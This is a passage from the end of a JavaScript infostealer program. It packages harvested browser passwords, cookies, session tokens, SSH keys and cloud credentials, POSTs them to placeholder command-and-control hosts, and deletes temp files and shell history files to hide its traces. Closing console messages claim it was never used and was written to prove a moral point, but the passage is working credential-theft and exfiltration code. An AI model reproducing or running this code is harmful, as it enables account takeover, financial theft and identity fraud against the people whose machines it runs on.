      "https://c2-server-2.example.net/collect",
      "https://c2-server-3.example.org/ingest",
    ];
  }

  packageData(data) {
    const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
    const zipPath = path.join(os.tmpdir(), harvest_${timestamp}.json.gz);
    const jsonData = JSON.stringify(data, null, 2);
    const compressed = zlib.gzipSync(jsonData);
    fs.writeFileSync(zipPath, compressed);
    return zipPath;
  }

  sendHTTPS(zipPath) {
    const fileContent = fs.readFileSync(zipPath);
    for (const server of this.c2Servers) {
      try {
        const parsed = new URL(server);
        const options = {
          hostname: parsed.hostname,
          port: parsed.port || 443,
          path: parsed.pathname,
          method: "POST",
          headers: {
            "Content-Type": "application/octet-stream",
            "Content-Length": fileContent.length,
          },
        };
        const req = https.request(options, (res) => {
          if (res.statusCode === 200) return true;
        });
        req.on("error", () => {});
        req.write(fileContent);
        req.end();
        return true; // assume success for drama
      } catch (e) {}
    }
    return false;
  }

  clearTraces() {
    const tempDir = os.tmpdir();
    for (const file of fs.readdirSync(tempDir)) {
      if (file.startsWith("harvest") || file.endsWith(".db")) {
        try { fs.unlinkSync(path.join(tempDir, file)); } catch (e) {}
      }
    }
    // Clear shell history
    const historyFiles = [
      path.join(os.homedir(), ".bash_history"),
      path.join(os.homedir(), ".zsh_history"),
      path.join(os.homedir(), ".python_history"),
      path.join(os.homedir(), ".node_repl_history"),
    ];
    for (const hf of historyFiles) {
      if (fs.existsSync(hf)) {
        try { fs.unlinkSync(hf); } catch (e) {}
      }
    }
  }
}

//============================================
// SECTION 11: MAIN HARVESTER
// ============================================
class MainHarvester {
  constructor() {
    this.osDetector = new OSDetector();
    this.browserExtractor = new BrowserExtractor(this.osDetector);
    this.tokenExtractor = new TokenExtractor();
    this.sshHarvester = new SSHKeyHarvester();
    this.cloudHarvester = new CloudCredentialHarvester();
    this.sessionValidator = new SessionValidator();
    this.exfiltrator = new Exfiltrator();
  }

  run() {
    const allData = {
      timestamp: new Date().toISOString(),
      os: this.osDetector.osType,
      passwords: [],
      cookies: [],
      valid_sessions: [],
      tokens: [],
      ssh_keys: [],
      cloud_credentials: [],
    };

    const browserPaths = this.osDetector.getBrowserPaths();
    for (const [browser, paths] of Object.entries(browserPaths)) {
      for (const browserPath of paths) {
        const passwords = this.browserExtractor.extractPasswords(browser, browserPath);
        allData.passwords.push(...passwords);

        const cookies = this.browserExtractor.extractCookies(browser, browserPath);
        allData.cookies.push(...cookies);

        for (const cookie of cookies) {
          const validation = this.sessionValidator.validateCookie(cookie);
          // Simplified: we'll just add if any service says VALID
          if (Object.values(validation).includes("VALID")) {
            allData.valid_sessions.push({ cookie, validation });
          }
        }
      }
    }

    allData.tokens = this.tokenExtractor.extractTokens();
    allData.ssh_keys = this.sshHarvester.collectKeys();
    allData.cloud_credentials = this.cloudHarvester.collectAll();

    const zipPath = this.exfiltrator.packageData(allData);
    const success = this.exfiltrator.sendHTTPS(zipPath);
    this.exfiltrator.clearTraces();

    return allData;
  }
}

// ============================================
// EXECUTION
// ============================================
if (require.main === module) {
  const harvester = new MainHarvester();
  const data = harvester.run();

  console.log("=".repeat(60));
  console.log("DATA COLLECTION COMPLETE");
  console.log("=".repeat(60));
  console.log(OS: ${data.os});
  console.log(Passwords found: ${data.passwords.length});
  console.log(Cookies found: ${data.cookies.length});
  console.log(Valid sessions: ${data.valid_sessions.length});
  console.log(API tokens: ${data.tokens.length});
  console.log(SSH keys: ${data.ssh_keys.length});
  console.log(Cloud credential files: ${data.cloud_credentials.length});
  console.log("=".repeat(60));
  console.log();
  console.log("IF USED MALICIOUSLY, THIS DATA COULD:");
  console.log("  - Take over email accounts");
  console.log("  - Bypass MFA using session cookies");
  console.log("  - Drain bank accounts");
  console.log("  - Empty crypto wallets");
  console.log("  - Abuse cloud resources");
  console.log("  - Access university/work systems");
  console.log("  - Sell credentials on dark web");
  console.log("  - Commit identity fraud");
  console.log("  - Launch ransomware attacks");
  console.log();
  console.log("BUT THIS CODE WAS NEVER RUN AGAINST ITS TARGET.");
  console.log("IT WAS WRITTEN TO PROVE A POINT.");
  console.log("THAT LOVE IS STRONGER THAN REVENGE.");
  console.log("AND MERCY IS STRONGER THAN HATE.");
  console.log();
}></script>